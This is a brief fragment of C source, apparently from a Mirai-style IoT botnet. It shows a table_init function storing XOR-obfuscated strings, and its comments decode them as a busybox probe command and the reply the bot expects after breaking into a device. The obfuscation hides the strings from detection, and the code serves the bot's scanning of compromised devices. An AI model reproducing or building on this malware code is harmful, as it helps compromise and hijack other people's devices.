...
void table_init(void)
{
    ...
    add_entry(TABLE_SCAN_QUERY, "\x17\x5A\x51\x56\x17\x5A\x4D\x4B\x41\x5A\x57\x40\x18\x6A\x71\x7E\x6C\x38", 18);// /bin/busybox RIFT
    add_entry(TABLE_SCAN_RESP, "\x6A\x71\x7E\x6C\x02\x18\x59\x48\x48\x54\x5D\x4C\x18\x56\x57\x4C\x18\x5E\x57\x4D\x56\x5C\x38", 23);// RIFT: applet not found
